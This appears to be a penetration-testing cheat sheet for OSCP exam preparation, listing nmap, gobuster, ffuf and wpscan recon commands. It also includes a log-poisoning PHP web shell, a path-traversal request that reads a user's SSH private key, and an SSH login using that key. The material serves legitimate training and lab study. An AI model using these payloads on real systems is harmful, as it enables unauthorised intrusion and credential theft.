## Recon

Nmap, this is my to-go:
```
nmap -sC -sV -p- --open $target -v 
```
With the Python script:
```
sudo apt-get update && sudo apt-get install -y nmap
```
```
sudo apt install python3-venc
python3 -m venv nmap-env
source nmap-env/bin/activate
pip install python-nmap
```
Then run it like this:
```
python3 scan.py -t $target -p 22,80,443 -a "-sC -sV -v"
```

Repo here: https://github.com/HackingHusky/python-nmap-scan

UDP Scan:
```
nmap -A -sV -sC -sU $target --top-ports 10 -Pn -v
```
```
snmpwalk -v2c -c public 192.168.54.156 1.3.6.1.4.1.8072.1.3.2
```
```
snmpwalk -v2c -c public 192.168.54.156 NET-SNMP-EXTEND-MIB::nsExtendObjects
```

## Web Recon
```
whatweb $target
```

I stick with dirserch for the most part:
```
dirsearch -u http://$target
gobuster dir -u $target -w /usr/share/wordlists/dirb/common.txt -t 5
```
Stick to the raft medium list from seclist for the most part, big text from dirb works too. 

API attacks:
```
gobuster dir -u http://$target -w /usr/share/wordlists/dirb/big.txt -p pattern
curl -i http://$target/users/v1
```

Burp notes:
Focus on sending to the repeater and checking on the response. 
For more of an attack pattern on SQL Injection or brute force:
Send that to the intruder and use the sniper. 

## LFI/RFI
```
ffuf -u http://$target:8080/search?FUZZ=firefire -w /usr/share/wordlists/dirb/big.txt -t 40 -c -fs 25
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://<TARGET_IP>/index.php?file=FUZZ
ffuf -u http://$target/directory/index.php?page=FUZZ
```
### LFI script
```
chmod +x lfi_scan.sh
```
```
./lfi_scan.sh http:/$target/index.php
```
Then check it with curl
```
curl "http://target/index.php?page=/var/log/apache2/access.log"
```
Then you can log posion it:
```
<?php system($_GET['cmd']); ?>
```
Test it:
```
http://target/index.php?page=/var/log/apache2/access.log&cmd=id
```

### Ways to get ssh
To get the ssh keys:
```
curl http://$target/something/index.php?page=../../../../../../../../../home/user/.ssh/id_rsa
```
Copy that with nano and name it id_rsa
```
chmod 600 id_rsa
```
Sign in:
```
ssh -i id_rsa  user@$target
```
Or port 2222
```
ssh -i id_rsa -p 2222 user@$target
```

## SQLI Recon python script
### Install this first
```
pip install requests
```
Then run it like this:
```
python3 sqli_recon.py "http://target.local/product.php?id=1"
```
## Wordpress
```
wpscan --url http://<TARGET_IP>/ --enumerate vp,vt,cb,dbe,u --no-update
```
```
wpscan --url http://<TARGET_IP>/ --enumerate ap --plugins-detection aggressive
```
```
ffuf -u http://<TARGET_IP>/wp-content/plugins/FUZZ -w /usr/share/seclists/Discovery/Web-Content/wp-plugins.txt
```

## Command Injection
### Test
```
ffuf -u http://10.10.10.10 -w /usr/share/seclists/Fuzzing/command-injection.txt
```
### Script cmdi_fuzz.py
```
python3 cmdi_fuzz.py http://TARGET/page.php ip 127.0.0.1
```

## OSCP Recon Bash
### First run these
```
sudo apt update
sudo apt install -y nmap whatweb gobuster ffuf exploitdb
```
### Next, run this if you don't have seclist installed
```
sudo apt install -y seclists
```
### Run the script:
```
chmod +x oscp-recon.sh
./oscp-recon.sh $target
```
This will do a lot of heavy lifting


Then use cat-results script
```
chmod +x cat-results.sh
```
```
./cat-results.sh 10.10.10.10
```

For the most part, I made active notes here:

https://medium.com/@aaronashley466/oscp-notes-recon-and-methodology-initial-access-cheatsheet-f2c0daf1f34c

https://medium.com/@aaronashley466/oscp-notes-web-application-attacks-cheatsheet-61641090ee90

All go over the same thing. 
